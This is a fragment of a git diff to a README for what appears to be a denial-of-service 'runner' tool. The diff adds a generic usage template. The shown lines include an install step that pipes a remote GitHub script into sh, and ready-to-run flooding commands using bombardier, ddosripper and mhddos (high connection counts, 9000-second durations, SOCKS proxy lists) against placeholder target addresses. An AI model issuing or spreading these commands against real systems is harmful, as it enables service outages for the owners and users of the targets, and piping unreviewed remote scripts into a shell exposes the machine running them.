@@ -18,6 +18,8 @@ curl https://raw.githubusercontent.com/ctukraine22/runner/master/install.sh | sh
 # Run
 
 ```
+/runner/run.sh %tool% %tool-args%
+
 /runner/run.sh bombardier -p "i,p,r" -c 1000 -d 9000s -l x.x.x.x 80 
 /runner/run.sh ddosripper x.x.x.x 80 
 /runner/run.sh mhddos SLOW http://x.x.x.x 5 100 socks5.txt 100 9000
